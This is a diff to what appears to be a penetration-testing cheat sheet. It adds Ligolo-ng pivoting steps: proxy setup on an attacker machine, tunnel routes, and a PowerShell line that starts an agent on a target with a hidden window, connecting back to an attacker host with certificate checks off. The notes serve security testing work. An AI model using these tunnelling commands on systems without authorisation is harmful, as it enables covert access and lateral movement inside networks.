@@ -3767,18 +3767,13 @@ lftp <USERNAME>@<RHOST>:~> ftp:ssl-force true
 lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
 ```
 
-## Ligolo
+## Ligolo-ng
 
 > https://github.com/nicocha30/ligolo-ng
 
 ### Download Proxy and Agent
 
 > https://github.com/nicocha30/ligolo-ng/releases
-
-```console
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
-```
 
 ### Prepare Tunnel Interface
 
@@ -3831,6 +3826,44 @@ $ sudo ip route add 240.0.0.1/32 dev ligolo
 ```console
 [Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
+```
+
+### Alternative Session Configuration
+
+#### Setup Proxy on Attacker Machine
+
+```console
+$ sudo ./proxy -selfcert
+```
+
+#### Prepare Tunnel Interface
+
+```console
+ligolo-ng » ifcreate --name ligolo
+```
+
+#### Add Route to Tunnel Interface
+
+```console
+ligolo-ng » route_add --name ligolo --route <SUBNET>
+```
+
+#### Setup Agent on Target Machine
+
+```cmd
+PS C:\> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
+```
+
+### Error Handling
+
+#### Fixing tun.New device or resource busy
+
+```console
+$ sudo ip link delete ligolo
+```
+
+```console
+[Agent : user@target] » start
 ```
 
 ## Linux
@@ -6054,6 +6087,8 @@ $ sudo rdate -s <RHOST>
 #### timedatectl
 
 ```console
+$ sudo timedatectl show
+$ sudo timedatectl set-ntp false
 $ sudo timedatectl set-timezone UTC
 $ sudo timedatectl list-timezones
 $ sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
